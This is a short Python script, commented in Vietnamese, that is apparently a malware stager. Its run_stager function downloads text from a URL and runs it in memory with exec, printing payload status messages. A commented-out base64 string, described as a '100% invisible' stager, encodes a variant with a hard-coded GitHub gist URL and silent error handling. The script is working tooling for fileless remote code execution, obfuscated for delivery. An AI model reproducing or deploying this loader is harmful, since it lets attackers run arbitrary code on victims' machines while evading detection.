import urllib.request

def run_stager(): 
    
    PAYLOAD_URL = ""
    
    try:
        #  Kéo dữ liệu từ Internet về (Chỉ đọc, không ghi file)
        req = urllib.request.Request(PAYLOAD_URL)
        response = urllib.request.urlopen(req)
        
        #  Đọc nội dung gói tin thành dạng Text lưu vào biến trong RAM
        memory_payload = response.read().decode('utf-8')
        print("[*] Payload fetched into RAM. Size:", len(memory_payload), "bytes")
         
        exec(memory_payload, globals())
        
    except Exception as e:
        print(f"[!] Transport error: {e}")

if __name__ == "__main__":
    run_stager()



    # Chuỗi Base64 mới: Stager tàng hình 100% 
    # encoded_stager = "aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmRlZiBydW5fc3RhZ2VyKCk6CiAgICBQQVlMT0FEX1VSTCA9ICJodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2toYW5ocGhhbS1uZXQvNTc4MDY3MmY0ZDBmOGEwMzQyYWI1MDI1ODQ3MjY3NGYvcmF3L2NhMWU0NThlZWI4YWJlNTg5OTk4ZDZhNDgzOTA0MGQ2ZjA0MTVlMzYvZ2lzdGZpbGUxLnR4dCIKICAgIHRyeToKICAgICAgICByZXEgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KFBBWUxPQURfVVJMKQogICAgICAgIHJlc3BvbnNlID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpCiAgICAgICAgbWVtb3J5X3BheWxvYWQgPSByZXNwb25zZS5yZWFkKCkuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgZXhlYyhtZW1vcnlfcGF5bG9hZCwgZ2xvYmFscygpKQogICAgZXhjZXB0IEV4Y2VwdGlvbjoKICAgICAgICBwYXNzCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBydW5fc3RhZ2VyKCk="